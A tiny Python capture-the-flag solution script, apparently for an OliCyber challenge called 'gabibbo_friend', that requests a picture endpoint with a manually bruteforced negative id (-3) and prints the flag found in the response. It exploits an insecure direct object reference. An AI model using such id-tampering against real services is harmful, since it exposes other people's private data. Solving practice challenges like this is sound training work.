import requests

#-3 è flag per bruteforce manuale :)

url = 'http://gabibbo_friend.challs.olicyber.it'

r = requests.get(f"{url}/get-picture?id=-3").text

for i in r.split():
    if "flag{" in i.lower():
        print(i)